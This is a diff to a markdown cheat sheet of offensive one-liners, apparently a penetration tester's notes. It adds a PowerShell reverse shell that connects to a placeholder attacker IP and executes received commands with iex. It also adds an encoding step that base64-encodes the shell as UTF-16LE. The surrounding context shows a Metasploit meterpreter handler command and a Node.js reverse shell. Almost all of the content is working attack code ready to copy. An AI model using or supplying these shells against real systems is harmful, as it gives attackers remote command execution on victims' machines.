@@ -5,6 +5,7 @@
 ### Table of Contents
 - [Metasploit Handler Oneliner](#metasploit-handler-oneliner)
 - [Reverse Shell JavaScript](#reverse-shell-javascript)
+- [Reverse Shell PowerShell](#reverse-shell-powershell)
 
 ---
 
@@ -17,7 +18,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 ```
 
 ## Reverse Shell JavaScript
-- Context specific, e.g. without URL encode
+- Context specific, e.g. `nodejs` (here: without URL encode)
 
 ```js
 // NOT OpenBSD netcat, doesn't know -e
@@ -32,3 +33,18 @@ var client = new net.Socket();
 client.connect(4444, "<attack_ip>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
 ```
+
+## Reverse Shell PowerShell
+- Simple oneliner for creating a `powershell` reverse shell
+
+```powershell
+# Oneliner
+$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+```
+
+-  Encode shell
+
+```bash
+iconv -f ASCII -t UTF-16LE shellcode.txt | base64 | tr -d "\n"
+```
+
